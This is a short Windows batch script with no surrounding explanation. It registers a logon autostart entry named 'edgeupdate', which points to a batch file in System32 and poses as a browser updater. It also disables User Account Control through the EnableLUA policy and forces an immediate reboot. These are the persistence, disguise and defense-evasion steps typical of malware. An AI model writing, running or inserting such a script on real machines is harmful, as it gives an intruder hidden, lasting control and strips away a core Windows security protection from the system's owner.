@echo off
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "edgeupdate" /t REG_SZ /f /d "C:\Windows\System32\edgeupdate.bat"
C:\Windows\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
shutdown /r /t 0
